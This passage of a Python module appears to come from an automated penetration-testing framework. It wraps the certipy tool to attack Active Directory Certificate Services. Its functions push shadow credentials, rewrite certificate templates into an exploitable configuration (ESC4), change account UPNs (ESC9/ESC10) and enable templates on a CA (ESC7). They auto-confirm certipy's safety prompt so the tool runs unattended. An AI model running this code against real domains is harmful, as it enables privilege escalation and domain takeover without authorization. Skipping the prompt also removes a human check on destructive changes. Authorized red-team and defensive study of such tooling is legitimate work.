            "error": f"Invalid shadow subaction '{subaction}'. Must be one of: {valid_subactions}",
        }

    args = [subaction, "-target", target, "-account", account] + auth_args
    if device_id:
        args.extend(["-device-id", device_id])

    return await run_certipy("shadow", args, timeout=timeout)


async def certipy_template(
    target: str,
    template: str,
    auth_args: list[str],
    save_old: bool = True,
    configuration: dict[str, Any] | None = None,
    write_default: bool = False,
    target_ip: str | None = None,
    timeout: int = 120,
) -> dict[str, Any]:
    """Modify a certificate template configuration.

    Used in ESC4 exploitation to make a template vulnerable, and in rollback
    to restore the original configuration.

    Args:
        target: Hostname (preferably FQDN) for ``-target``.  Used for
            the LDAP write that updates the template object.  Pass the
            DC FQDN here and use *target_ip* to override DNS resolution.
        template: Certificate template name.
        auth_args: Authentication arguments.
        save_old: If ``True``, save the old template configuration to a
            JSON file before modifying — the path ends up in
            ``parsed["old_config_path"]`` so callers can pass it back
            via ``configuration`` to roll back.
        configuration: Optional dict with ``"config_path"`` pointing at
            a previously-saved JSON config to write back.  Used by ESC4
            rollback / handlers' restore step.
        write_default: When ``True``, pass ``-write-default-configuration``
            so certipy rewrites the template to its default
            ESC1-vulnerable shape (the actual ESC4 attack).  Without
            this, the command is a no-op or save-only.
        target_ip: Explicit IP override for *target* — passed via
            ``-target-ip`` so certipy bypasses DNS resolution.  Same
            pattern as :func:`certipy_request`; necessary on attacker
            hosts that don't have ``/etc/hosts`` entries for the target
            domain.
        timeout: Maximum seconds to wait.  Default raised to 120s
            because template-write operations involve LDAP roundtrips
            plus an interactive prompt confirmation; the previous 60s
            default fired before certipy could finish on slower DCs.

    Returns:
        Result dict. On success, ``parsed["old_config_path"]`` may contain
        the path to the saved original configuration.

    Notes:
        certipy ``template`` interactively asks "Are you sure you want
        to apply these changes?" with no flag to suppress the prompt.
        We auto-confirm by piping ``y\\n`` to stdin so unattended
        pentest automation never hangs.  See :func:`run_certipy` for
        the stdin plumbing.
    """
    args = ["-target", target, "-template", template] + auth_args

    if target_ip:
        args.extend(["-target-ip", target_ip])
    if write_default:
        args.append("-write-default-configuration")
    if save_old:
        # certipy uses -save-configuration <file>, not -save-old
        args.extend(["-save-configuration", f"{template}_backup.json"])
    if configuration:
        config_path = configuration.get("config_path")
        if config_path:
            # certipy uses -write-configuration, not -configuration
            args.extend(["-write-configuration", config_path])

    # Auto-confirm the "Are you sure?" prompt.  Multiple newlines
    # cover any second prompt certipy v5 might ask (it's stable in v5
    # but defending against future versions costs nothing here).
    return await run_certipy(
        "template", args, timeout=timeout, input_data=b"y\ny\ny\n",
    )


async def certipy_account(
    target: str,
    user: str,
    auth_args: list[str],
    action: str = "update",
    upn: str | None = None,
    old_upn: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Manage an account's attributes (UPN, SPN, etc.) for ESC9/ESC10 attacks.

    certipy account requires a sub-action: ``update``, ``read``, ``create``,
    or ``delete``.

    Args:
        target: Domain controller host or IP.
        user: Target account sAMAccountName to modify.
        auth_args: Authentication arguments.
        action: Account sub-action (``update``, ``read``, ``create``, ``delete``).
        upn: New UPN to set on the target account.
        old_upn: Previous UPN to restore (used in rollback).

    Returns:
        Result dict. On success, ``parsed`` contains ``old_upn`` and ``new_upn``.
    """
    args = [action, "-target", target, "-user", user] + auth_args

    if upn:
        args.extend(["-upn", upn])

    return await run_certipy("account", args, timeout=timeout)


async def certipy_ca(
    target: str,
    ca: str,
    auth_args: list[str],
    enable_template: str | None = None,
    disable_template: str | None = None,
    timeout: int = 60,
) -> dict[str, Any]:
    """Manage Certificate Authority configuration.

    Can enable/disable certificate templates on the CA, which is useful
    for ESC7-style attacks and rollback operations.

    Args:
        target: Domain controller host or IP.
        ca: Certificate Authority name.
        auth_args: Authentication arguments.
        enable_template: Template name to enable on the CA.
        disable_template: Template name to disable on the CA.

    Returns:
        Result dict.
    """
    args = ["-target", target, "-ca", ca] + auth_args

    if enable_template:
        args.extend(["-enable-template", enable_template])
    if disable_template:
        args.extend(["-disable-template", disable_template])

    return await run_certipy("ca", args, timeout=timeout)


async def certipy_ca_officer(
    ca_name: str,
    template_name: str | None = None,
    domain: str | None = None,
    username: str | None = None,
    password: str | None = None,
    dc_ip: str | None = None,
    enable: bool = True,
    timeout: int = 60,
) -> dict[str, Any]:
    """Manage certificate authority officer operations via certipy.

    Used for ESC7 exploitation where the attacker has CA Officer privileges
    and needs to enable/disable certificate templates or approve pending
    certificate requests.

    Args:
        ca_name: Name of the Certificate Authority.
        template_name: Template to enable/disable (if applicable).
        domain: AD domain name.
        username: Authenticating username.
        password: Password for authentication.
        dc_ip: Domain controller IP address.
        enable: If True, enable the template; if False, disable it.
        timeout: Maximum seconds to wait.

    Returns:
        Standardised result dict with parsed certipy output.
    """
    args: list[str] = ["-ca", ca_name]

    if template_name:
        flag = "-enable-template" if enable else "-disable-template"
        args.extend([flag, template_name])

    if domain:
        args.extend(["-domain", domain])
    if username:
        args.extend(["-username", username])
    if password:
        args.extend(["-password", password])
    if dc_ip:
        args.extend(["-dc-ip", dc_ip])

    return await run_certipy("ca", args, timeout=timeout)
